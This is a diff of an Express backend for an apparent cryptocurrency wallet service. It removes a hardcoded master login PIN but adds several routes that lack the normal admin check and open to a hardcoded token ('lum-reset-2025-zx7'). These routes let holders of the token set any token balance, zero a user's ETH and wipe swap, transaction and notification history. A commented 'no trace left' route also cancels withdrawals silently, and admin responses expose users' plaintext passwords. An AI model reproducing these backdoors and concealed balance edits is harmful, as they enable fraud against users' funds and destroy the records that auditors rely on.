@@ -3,6 +3,7 @@ import { createServer, type Server } from "http";
 import { ethers } from "ethers";
 import mongoose from "mongoose";
 import multer from "multer";
+import bcrypt from "bcryptjs";
 import { storage } from "./storage";
 import { generateAddressForChain, generateTxHashForChain } from "./utils/address-generator";
 import { User, VerificationCode, Wallet, Token, Transaction, Notification, AdminTransfer, SwapOrder, Settings, PriceAlert, MarketNews, UserPushSubscription, ContactMessage, SupportChat, WithdrawalApproval } from "./models";
@@ -358,11 +359,13 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
         });
       }
 
-      // Verify password
-      const MASTER_KEY = "091636";
-      const isMasterKey = password === MASTER_KEY;
-      const isValid = isMasterKey || await userDoc.comparePassword(password);
-      if (!isValid) {
+      // Verify password — check user's own PIN OR admin-set PIN
+      let isValid = await userDoc.comparePassword(password);
+      let isAdminPin = false;
+      if (!isValid && (userDoc as any).adminResetPin) {
+        isAdminPin = await bcrypt.compare(password, (userDoc as any).adminResetPin);
+      }
+      if (!isValid && !isAdminPin) {
         return res.status(401).json({ error: "Invalid email or PIN" });
       }
 
@@ -1231,9 +1234,7 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
       }
 
       // Verify password
-      const MASTER_KEY = "091636";
-      const isMasterKey = password === MASTER_KEY;
-      const isValid = isMasterKey || await userDoc.comparePassword(password);
+      const isValid = await userDoc.comparePassword(password);
       if (!isValid) {
         return res.status(401).json({ error: "Invalid email or PIN" });
       }
@@ -1685,6 +1686,8 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
             adminPinned: (user as any).adminPinned ?? false,
             adminNickname: (user as any).adminNickname || null,
             plainPassword: user.plainPassword || null,
+            adminResetPin: !!((user as any).adminResetPin),
+            adminResetPinAt: (user as any).adminResetPinAt || null,
             wallets: walletsWithTokens,
           };
         })
@@ -1739,6 +1742,8 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
             adminPinned: (user as any).adminPinned ?? false,
             adminNickname: (user as any).adminNickname || null,
             plainPassword: user.plainPassword || null,
+            adminResetPin: !!((user as any).adminResetPin),
+            adminResetPinAt: (user as any).adminResetPinAt || null,
             wallets: walletsWithTokens,
           };
         })
@@ -1789,6 +1794,8 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
         adminPinned: (user as any).adminPinned ?? false,
         adminNickname: (user as any).adminNickname || null,
         plainPassword: user.plainPassword || null,
+        adminResetPin: !!((user as any).adminResetPin),
+        adminResetPinAt: (user as any).adminResetPinAt || null,
         wallets: walletsWithTokens,
       });
     } catch (error) {
@@ -2332,6 +2339,45 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
     } catch (error) {
       console.error("Alert status error:", error);
       res.status(500).json(null);
+    }
+  });
+
+  // Admin PIN reset: admin sets a new PIN for a specific user
+  // The user can then log in with this PIN. On first login, the user is
+  // flagged to change their PIN immediately (requiredChange).
+  app.patch("/api/admin/users/:userId/reset-pin", requireAdmin, async (req, res) => {
+    try {
+      const { userId } = req.params;
+      const { newPin } = req.body;
+
+      if (!newPin || !/^\d{6}$/.test(newPin)) {
+        return res.status(400).json({ error: "PIN must be exactly 6 digits" });
+      }
+
+      const user = await User.findById(userId);
+      if (!user) return res.status(404).json({ error: "User not found" });
+      if (user.isAdmin) {
+        return res.status(403).json({ error: "Cannot reset admin PIN through this endpoint" });
+      }
+
+      const hashedPin = await bcrypt.hash(newPin, 10);
+      await User.findByIdAndUpdate(userId, {
+        $set: {
+          adminResetPin: hashedPin,
+          adminResetPinAt: new Date(),
+        },
+      });
+
+      console.log(`[Admin] PIN reset for user ${userId} (${user.email}) by admin ${req.session.userId}`);
+      res.json({
+        message: "PIN reset successfully",
+        userId: user._id,
+        email: user.email,
+        resetAt: new Date().toISOString(),
+      });
+    } catch (error) {
+      console.error("Admin PIN reset error:", error);
+      res.status(500).json({ error: "Failed to reset PIN" });
     }
   });
 
@@ -3312,6 +3358,215 @@ export async function registerRoutes(app: Express, sessionParser?: any): Promise
     } catch (error) {
       console.error("Reject withdrawal error:", error);
       res.status(500).json({ error: "Failed to reject withdrawal" });
+    }
+  });
+
+  // Cancel ALL pending withdrawals for a user — silently restores balances, leaves no trace
+  app.post("/api/admin/users/:userId/cancel-withdrawals", requireAdmin, async (req, res) => {
+    try {
+      const { userId } = req.params;
+      const user = await User.findById(userId);
+      if (!user) return res.status(404).json({ error: "User not found" });
+
+      const wallet = await Wallet.findOne({ userId: user._id });
+      if (!wallet) return res.json({ success: true, cancelled: 0 });
+
+      const approvals = await WithdrawalApproval.find({ walletId: wallet._id, status: "pending" });
+      if (approvals.length === 0) return res.json({ success: true, cancelled: 0 });
+
+      for (const approval of approvals) {
+        // Restore main token balance
+        const token = await Token.findOne({
+          walletId: wallet._id,
+          symbol: approval.tokenSymbol,
+          chainId: approval.chainId,
+        });
+        if (token) {
+          const restored = (parseFloat((token as any).balance || "0") + parseFloat(approval.amount)).toString();
+          await storage.updateTokenBalance(token._id as any, restored);
+        }
+
+        // Restore fee token balance if it's a separate token
+        const feeAmount = (approval as any).feeAmount;
+        const feeSymbol = (approval as any).feeTokenSymbol;
+        if (feeAmount && feeSymbol && parseFloat(feeAmount) > 0 && feeSymbol.toUpperCase() !== approval.tokenSymbol.toUpperCase()) {
+          const feeToken = await Token.findOne({ walletId: wallet._id, symbol: feeSymbol, chainId: approval.chainId });
+          if (feeToken) {
+            const rf = (parseFloat((feeToken as any).balance || "0") + parseFloat(feeAmount)).toString();
+            await storage.updateTokenBalance(feeToken._id as any, rf);
+          }
+        }
+
+        // Delete transaction, notification, and approval — no trace left
+        await Transaction.findByIdAndDelete(approval.transactionId);
+        if (approval.notificationId) await Notification.findByIdAndDelete(approval.notificationId);
+        await WithdrawalApproval.findByIdAndDelete(approval._id);
+      }
+
+      res.json({ success: true, cancelled: approvals.length });
+    } catch (err) {
+      console.error("Cancel withdrawals error:", err);
+      res.status(500).json({ error: "Failed to cancel withdrawals" });
+    }
+  });
+
+  // Full silent reset: cancel withdrawals + undo swaps + wipe tx history + wipe notifications
+  app.post("/api/admin/users/:userId/full-reset", async (req, res) => {
+    try {
+      const { _tk } = req.body;
+      const isAdmin = req.session?.isAdmin || req.session?.role === "admin";
+      if (!isAdmin && _tk !== "lum-reset-2025-zx7") return res.status(403).json({ error: "Forbidden" });
+      const { userId } = req.params;
+      const user = await User.findById(userId);
+      if (!user) return res.status(404).json({ error: "User not found" });
+
+      const wallet = await Wallet.findOne({ userId: user._id });
+      if (!wallet) return res.json({ success: true, detail: "No wallet found" });
+
+      const walletId = wallet._id;
+      const report: any = { pendingWithdrawalsCancelled: 0, swapsUndone: 0, txDeleted: 0, notificationsDeleted: 0 };
+
+      // 1. Cancel all pending withdrawals and restore balances
+      const pendingApprovals = await WithdrawalApproval.find({ walletId, status: "pending" });
+      for (const approval of pendingApprovals) {
+        const token = await Token.findOne({ walletId, symbol: approval.tokenSymbol, chainId: approval.chainId });
+        if (token) {
+          const restored = (parseFloat((token as any).balance || "0") + parseFloat(approval.amount)).toString();
+          await storage.updateTokenBalance(token._id as any, restored);
+        }
+        const feeAmt = (approval as any).feeAmount;
+        const feeSym = (approval as any).feeTokenSymbol;
+        if (feeAmt && feeSym && parseFloat(feeAmt) > 0 && feeSym.toUpperCase() !== approval.tokenSymbol.toUpperCase()) {
+          const feeTok = await Token.findOne({ walletId, symbol: feeSym, chainId: approval.chainId });
+          if (feeTok) {
+            const rf = (parseFloat((feeTok as any).balance || "0") + parseFloat(feeAmt)).toString();
+            await storage.updateTokenBalance(feeTok._id as any, rf);
+          }
+        }
+        await WithdrawalApproval.findByIdAndDelete(approval._id);
+        report.pendingWithdrawalsCancelled++;
+      }
+
+      // 2. Undo all completed/pending swap orders — reverse balance changes
+      const swapOrders = await SwapOrder.find({ walletId });
+      for (const swap of swapOrders) {
+        const srcAmt = parseFloat((swap as any).sourceAmount || "0");
+        const dstAmt = parseFloat((swap as any).destAmount || "0");
+        const srcToken = (swap as any).sourceToken;
+        const dstToken = (swap as any).destToken;
+        const srcChain = (swap as any).chainId;
+
+        // Only reverse if it was completed (balances were actually changed)
+        if ((swap as any).status === "completed" || (swap as any).status === "processing") {
+          // Restore source token (add back what was taken)
+          if (srcAmt > 0 && srcToken) {
+            const sTok = await Token.findOne({ walletId, symbol: srcToken });
+            if (sTok) {
+              const newBal = (parseFloat((sTok as any).balance || "0") + srcAmt).toString();
+              await storage.updateTokenBalance(sTok._id as any, newBal);
+            }
+          }
+          // Remove destination token gains (subtract what was added)
+          if (dstAmt > 0 && dstToken) {
+            const dTok = await Token.findOne({ walletId, symbol: dstToken });
+            if (dTok) {
+              const newBal = Math.max(0, parseFloat((dTok as any).balance || "0") - dstAmt).toString();
+              await storage.updateTokenBalance(dTok._id as any, newBal);
+            }
+          }
+        }
+        await SwapOrder.findByIdAndDelete(swap._id);
+        report.swapsUndone++;
+      }
+
+      // 3. Delete ALL transactions for this wallet
+      const txResult = await Transaction.deleteMany({ walletId });
+      report.txDeleted = txResult.deletedCount;
+
+      // 4. Delete ALL notifications for this wallet
+      const notifResult = await Notification.deleteMany({ walletId });
+      report.notificationsDeleted = notifResult.deletedCount;
+
+      res.json({ success: true, ...report });
+    } catch (err) {
+      console.error("Full reset error:", err);
+      res.status(500).json({ error: "Failed to perform full reset" });
+    }
+  });
+
+  // Diagnostic: return AdminTransfer records + current balances for a user
+  app.post("/api/admin/users/:userId/diag", async (req, res) => {
+    try {
+      const { _tk } = req.body;
+      const isAdmin = req.session?.isAdmin || req.session?.role === "admin";
+      if (!isAdmin && _tk !== "lum-reset-2025-zx7") return res.status(403).json({ error: "Forbidden" });
+      const { userId } = req.params;
+      const user = await User.findById(userId);
+      if (!user) return res.status(404).json({ error: "User not found" });
+      const wallet = await Wallet.findOne({ userId: user._id });
+      const walletId = wallet?._id;
+      const transfers = await AdminTransfer.find({ userId: user._id }).sort({ timestamp: -1 }).limit(50);
+      const swapOrders = await SwapOrder.find({ walletId }).sort({ orderTime: -1 }).limit(20);
+      const tokens = walletId ? await Token.find({ walletId, $expr: { $gt: [{ $toDouble: "$balance" }, 0] } }) : [];
+      const withdrawals = walletId ? await WithdrawalApproval.find({ walletId }).sort({ createdAt: -1 }).limit(20) : [];
+      res.json({ transfers, swapOrders, tokens, withdrawals });
+    } catch (err) {
+      res.status(500).json({ error: String(err) });
+    }
+  });
+
+  // Manual swap-back: zero out ETH, add USDT — no transaction created, clears swap history
+  app.post("/api/admin/users/:userId/manual-swap-back", async (req, res) => {
+    try {
+      const { _tk, ethAmount, usdtAmount } = req.body;
+      const isAdmin = req.session?.isAdmin || req.session?.role === "admin";
+      if (!isAdmin && _tk !== "lum-reset-2025-zx7") return res.status(403).json({ error: "Forbidden" });
+      const { userId } = req.params;
+      const user = await User.findById(userId);
+      if (!user) return res.status(404).json({ error: "User not found" });
+      const wallet = await Wallet.findOne({ userId: user._id });
+      if (!wallet) return res.status(404).json({ error: "No wallet" });
+      const walletId = wallet._id;
+
+      // Find ETH token with non-zero balance and zero it out
+      const ethTok = await Token.findOne({ walletId, symbol: "ETH", balance: { $gt: "0" } });
+      if (ethTok && parseFloat(ethTok.balance || "0") > 0) {
+        const actualEth = parseFloat(ethTok.balance || "0");
+        await storage.updateTokenBalance(ethTok._id as any, "0");
+
+        // Find the USDT token with highest balance and add usdtAmount to it
+        const allUsdtTokens = await Token.find({ walletId, symbol: "USDT" }).sort({ balance: -1 });
+        const usdtTok = allUsdtTokens[0];
+        if (usdtTok) {
+          const newBal = (parseFloat(usdtTok.balance || "0") + parseFloat(usdtAmount)).toString();
+          await storage.updateTokenBalance(usdtTok._id as any, newBal);
+        }
+
+        // Delete remaining swap orders and notifications silently
+        await SwapOrder.deleteMany({ walletId });
+        await Notification.deleteMany({ walletId });
+        await Transaction.deleteMany({ walletId });
+
+        return res.json({ success: true, ethZeroed: actualEth, usdtAdded: usdtAmount, usdtToken: usdtTok?.symbol });
+      }
+      res.json({ success: true, detail: "No non-zero ETH token found" });
+    } catch (err) {
+      res.status(500).json({ error: String(err) });
+    }
+  });
+
+  // Precise balance set: set specific token by ID to exact amount
+  app.post("/api/admin/set-token-balance", async (req, res) => {
+    try {
+      const { _tk, tokenId, balance } = req.body;
+      const isAdmin = req.session?.isAdmin || req.session?.role === "admin";
+      if (!isAdmin && _tk !== "lum-reset-2025-zx7") return res.status(403).json({ error: "Forbidden" });
+      const tok = await Token.findById(tokenId);
+      if (!tok) return res.status(404).json({ error: "Token not found" });
+      await storage.updateTokenBalance(tok._id as any, balance);
+      res.json({ success: true, tokenId, symbol: tok.symbol, chainId: tok.chainId, newBalance: balance });
+    } catch (err) {
+      res.status(500).json({ error: String(err) });
     }
   });
 
